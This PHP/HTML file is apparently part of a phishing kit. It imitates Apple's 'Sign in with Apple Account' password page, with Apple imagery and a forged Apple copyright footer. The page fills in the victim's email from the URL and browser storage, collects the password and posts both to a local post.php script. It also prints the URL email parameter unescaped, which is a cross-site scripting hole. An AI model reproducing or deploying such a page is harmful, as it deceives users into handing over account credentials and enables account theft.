<?php require 'main.php';?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="res/css/pass.css">
    <title>Document</title>
</head>
<body>
    <header>
        <div class="logo"><img src="res/img/logo.png"></div>
        <div class="right"><img src="res/img/icon.png"></div>
    </header>
 <main>
    <div class="continer">
     <form action="post.php" method="post">
      <div class="log"><img src="res/img/log.png"></div>
         <div class="title">Sign in with Apple Account</div>
            <div class="co">
            <label>Email or Phone Number</label>
            <span id="displayEmail"></span> </div>
            <div class="col"><input type="hidden" name="email" value="<?php echo @$_GET['email']; ?>">
            <input type="password" id="u" name="pass" required> <label for="u">Password</label></div>
            <div class="sojec"><div class="chekbox"><input type="checkbox" id="chek"> <label for="chek">Keep me signed in</label></div>
            <div class="a"><a href="#">Forgot password?</a></div></div>
            <div class="btn">
            <div class="bu1"><button type="submit">Sign In</button></div>
            </form>
            </div>
            </main>
         <footer>
        <div class="f1"><a href="#">System Status</a> | <a href="#">Privacy Policy</a> | <a href="#">Terms & Conditions</a></div>
     <div class="f2">Copyright © 2026 Apple Inc. All rights reserved.</div>
    </footer>
 <script>
  const email = localStorage.getItem("user_email");
  document.getElementById("displayEmail").textContent = email || "";
</script>
</body>
</html>